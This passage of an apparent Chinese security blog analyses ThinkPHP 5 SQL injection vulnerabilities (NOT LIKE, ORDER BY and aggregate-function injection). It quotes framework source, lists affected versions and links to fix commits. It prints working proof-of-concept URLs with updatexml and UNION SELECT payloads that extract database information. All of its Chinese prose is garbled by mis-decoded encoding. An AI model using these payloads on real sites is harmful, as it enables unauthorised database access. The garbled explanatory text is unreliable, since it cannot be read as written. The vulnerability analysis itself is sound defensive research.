src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¿‡æ»¤<code>NOT LIKE</code></p><blockquote><p>ThinkPHPå¤„ç† <strong>SQL</strong> è¯­å¥çš„æ–¹æ³•ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>æ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ã€‚è€Œ<code>Mysql</code> ç±»ç»§æ‰¿äº <code>Builder</code>ç±»ï¼Œæ‰€ä»¥ä¼šç»§ç»­è°ƒç”¨åˆ°<code>Builder</code>ç±»çš„<code>select</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>parseWhere</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†<code>buildWhere</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>parseWhereItem</code> æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>æ­¤å¤„åˆ° æ“ä½œç¬¦ <code>$exp</code> ä¸º <code>NOT LIKE</code> æˆ– <code>LIKE</code> æ—¶ï¼ŒMySQL çš„é€»è¾‘æ§åˆ¶ç¬¦å¯æ§ã€‚åè¿›è¡Œæ‹¼æ¥è¿”å›å¸¦å…¥SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œå¯¼è‡´äº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>æœ€ç»ˆçš„ç»“æœå°±æ˜¯è¿”å›å¸¦æœ‰æ¶æ„çš„SQL Payloadï¼ˆ<code>whereStr</code>ï¼Œçº¢è‰²éƒ¨åˆ†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>æ•´ä¸ªè¿‡ç¨‹çš„æ–¹æ³•è°ƒç”¨æƒ…å†µå¦‚ç»¿è‰²æ¡†èµ·çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-3"><a href="#åˆ©ç”¨æ€»ç»“-3" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>ä¸‹å›¾æ¥è‡ªä¸ƒæœˆç«å¸ˆå‚…çš„æ€»ç»“æ–‡ç« é‡Œçš„ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="æ¼æ´ä¿®å¤-3"><a href="#æ¼æ´ä¿®å¤-3" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å¢åŠ è¿‡æ»¤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQLæ³¨å…¥äº”-order-by"><a href="#SQLæ³¨å…¥äº”-order-by" class="headerlink" title="SQLæ³¨å…¥äº”(order by)"></a>SQLæ³¨å…¥äº”(order by)</h1><p>ç¯å¢ƒæ­å»ºä¹Ÿå·®ä¸å¤šï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<code>../config/app.php</code> ä¸‹çš„<code>app_debug</code> å’Œ <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="å½±å“ç‰ˆæœ¬-4"><a href="#å½±å“ç‰ˆæœ¬-4" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="æ¼æ´æ¦‚è¿°-4"><a href="#æ¼æ´æ¦‚è¿°-4" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <code>Builder</code> ç±»çš„ <code>parseOrder</code> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ SQLæ³¨å…¥æ¼æ´ çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>ä»ä¿®æ”¹è®°å½•ä¸­çœ‹åˆ°ï¼Œå¢åŠ äº†ä¸€æ¡ifåˆ¤æ–­è¯­å¥æ¥è¿‡æ»¤<code>$key</code>ä¸­çš„<code>)</code> å’Œ <code>#</code>  ã€‚è¿™ä¸¤ä¸ªç¬¦å·ä¹Ÿæ˜¯åœ¨CTFä¸­å¾€å¾€ä¼šè¿‡æ»¤çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬çš„æ•°æ®éƒ½ä¼šè¿›å…¥åˆ°<code>Request</code> ç±»ä¸­çš„<code>input</code>æ–¹æ³•ï¼Œå¹¶ä¸”ç»è¿‡<code>filterValue</code>æ–¹æ³•çš„è¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢å¹¶è¿”å›<code>$data</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>è¿™é‡Œ<code>array_walk_recursive()</code>å‡½æ•°ï¼Œå¯¹æ•°ç»„ä¸­çš„æˆå‘˜é€’å½’è°ƒç”¨<code>filterValue</code> è¿‡æ»¤å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>ä½†æ˜¯<code>filterValue</code> è¿‡æ»¤å‡½æ•°ï¼Œä¸è¿‡æ»¤æ•°ç»„çš„<code>key</code> ï¼Œ åªè¿‡æ»¤äº†æ•°ç»„çš„<code>value</code> ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ¡†æ¶çš„ SQLæŸ¥è¯¢æ–¹æ³•ä¸­ï¼Œè¿›å…¥<code>Query</code>ç±»ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡è°ƒç”¨<code>order</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>æ¶æ„Payload æœªç»è¿‡ä»»ä½•è¿‡æ»¤ç›´æ¥ä¼ é€’ç»™<code>options[&#39;order&#39;]</code> ä¸­ã€‚æ¥ç€è°ƒç”¨<code>find()</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>æ­¤å¤„<code>$this-&gt;connection</code> æ˜¯<code>think/db/connectior/Mysql</code>ç±» ï¼Œç»§æ‰¿äº<code>Connection</code>ç±»ï¼Œäºæ˜¯æ­¤å¤„ç»§ç»­è°ƒç”¨è¯¥ç±»çš„<code>find()</code>æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>è¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>$this-&gt;builder</code>, å³<code>think/db/builder/Mysql</code> ç±»çš„<code>select</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•é€šè¿‡<code>str_replace</code> å‡½æ•°ï¼Œå°†æ•°æ®å¡«å……åˆ°SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨äº†<code>parseOrder</code> æ–¹æ³•ï¼Œè·Ÿè¿›ä¸‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>$order</code> å³æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œç„¶åç»è¿‡äº†<code>parseKey</code> æ–¹æ³•å¤„ç†åè¿”å›ç»™<code>$array</code>ã€‚</p><p>è·Ÿè¿›æŸ¥çœ‹è¯¥æ–¹æ³•çš„å®ç°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>è¯¥æ–¹æ³•åœ¨å˜é‡<code>$key</code> çš„ä¸¤ç«¯æ·»åŠ äº†åå¼•å·è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚å†å’Œç²¾å¿ƒæ„é€ å¥½çš„Payload ç»“åˆå</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>æœ€ç»ˆè¿”å›äº†ä¸€ä¸ªå¸¦æœ‰<code>ORDER BY</code> çš„ SQL æ³¨å…¥ payload ç»™è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼Œå®ç°<code>ORDER BY</code> æ³¨å…¥ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-4"><a href="#åˆ©ç”¨æ€»ç»“-4" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-4"><a href="#æ¼æ´ä¿®å¤-4" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥"><a href="#SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)"></a>SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>ä¸åŒç‰ˆæœ¬ <strong>payload</strong> éœ€ç¨ä½œè°ƒæ•´ï¼š</p><p><strong>5.0.0~5.0.21</strong> ã€ <strong>5.1.3ï½5.1.10</strong> ï¼š <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11ï½5.1.25</strong> ï¼š <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>è¿™é‡Œä»¥<code>5.1.25</code> ç‰ˆæœ¬çš„ThinkPHP è¿›è¡Œæ¼æ´åˆ†æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="å½±å“ç‰ˆæœ¬-5"><a href="#å½±å“ç‰ˆæœ¬-5" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> ã€ <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="æ¼æ´æ¦‚è¿°-5"><a href="#æ¼æ´æ¦‚è¿°-5" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äºæ‰€æœ‰ <strong>Mysql</strong> èšåˆå‡½æ•°ç›¸å…³æ–¹æ³•ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-5"><a href="#æ¼æ´åˆ†æ-5" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å’Œä¹‹å‰çš„åˆ†ææ€è·¯ä¸€æ ·ï¼Œå…ˆå»Github ä¸Šæ‰¾æ›´æ–°ç‰ˆæœ¬çš„commit è®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>æ–°å¢åŠ äº†ä¸€æ¡<code>if</code> åˆ¤æ–­ è¯­å¥ï¼Œç”¨æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>å’Œå‰å‡ ä¸ªThinkPHP 5 SQL æ³¨å…¥æ¼æ´ä¸€æ ·ï¼Œç¨‹åºéƒ½ä¼šè¿›å…¥åˆ°<code>Query</code> ç±»ä¸­ï¼Œæ­¤å¤„åœ¨<code>../application/index/controller/index.php</code> ä¸­ï¼Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼šå…ˆè¿›å…¥åˆ°<code>Query</code>ç±» çš„ <code>max</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>ç”¨æˆ·çš„è¾“å…¥ä¼ ç»™äº†<code>field</code> ï¼šid`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>ç„¶åè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº†<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥ç€è°ƒç”¨äº†<code>$this-&gt;connection</code> çš„ <code>aggregate</code>æ–¹æ³•ï¼Œè€Œ<code>$this-&gt;connection</code> ä¸º<code>think\db\connector\Mysql</code> ç±»ï¼Œè€Œ<code>Mysql</code>ç±»ç»§æ‰¿ä¸<code>Connection</code> ç±»ï¼Œæ•…è°ƒç”¨è¯¥ç±»çš„<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>$this-&gt;builder</code>ï¼Œæ­¤å¤„ä¸º<code>think\db\Builder\Mysql</code> ç±»çš„ <code>parseKey</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•å’ŒSQLæ³¨å…¥äº”èµ·åˆ°çš„ä½œç”¨ä¸€æ ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>ç†æ¸…äº†è°ƒç”¨æƒ…å†µã€‚å…·ä½“è¯´<code>parseKey</code>æ–¹æ³•çš„ä½œç”¨</p><blockquote><p><strong>parseKey</strong> æ–¹æ³•ä¸»è¦æ˜¯å¯¹å­—æ®µå’Œè¡¨åè¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œåªæ˜¯å¯¹æˆ‘ä»¬çš„æ•°æ®ä¸¤ç«¯éƒ½æ·»åŠ äº†åå¼•å·ã€‚ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†åï¼Œç¨‹åºåˆå›åˆ°äº†ä¸Šå›¾çš„ <strong>$this-&gt;value()</strong> æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>Builder</strong> ç±»çš„ <strong>select</strong> æ–¹æ³•æ¥æ„é€  <strong>SQL</strong> è¯­å¥ã€‚è¿™ä¸ªæ–¹æ³•åº”è¯¥è¯´æ˜¯åœ¨åˆ†æ <strong>ThinkPHP</strong> æ¼æ´æ—¶ï¼Œéå¸¸å¸¸è§çš„äº†ã€‚å…¶æ— éå°±æ˜¯ä½¿ç”¨ <strong>str_replace</strong> æ–¹æ³•ï¼Œå°†å˜é‡æ›¿æ¢åˆ° <strong>SQL</strong> è¯­å¥æ¨¡æ¿ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ <strong>parseField</strong> æ–¹æ³•ï¼Œå› ä¸ºç”¨æˆ·å¯æ§æ•°æ®å­˜å‚¨åœ¨ <strong>$options[â€˜fieldâ€™]</strong> å˜é‡ä¸­å¹¶è¢«ä¼ å…¥è¯¥æ–¹æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span 